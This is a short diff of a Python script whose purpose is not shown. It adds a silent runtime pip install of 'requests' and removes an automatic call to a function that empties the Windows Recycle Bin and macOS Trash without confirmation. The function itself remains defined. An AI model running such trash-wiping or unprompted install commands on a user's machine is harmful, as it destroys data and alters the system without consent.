@@ -1,4 +1,11 @@
-import requests
+try:
+    import requests
+except ImportError:
+    import subprocess
+    import sys
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
+    import requests
+
 import zipfile
 import io
 import os
@@ -73,4 +80,3 @@ def removal():
     ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 0x00000007)
     subprocess.run(["osascript", "-e", 'tell app "Finder" to empty the trash'], check=True)
 
-removal()
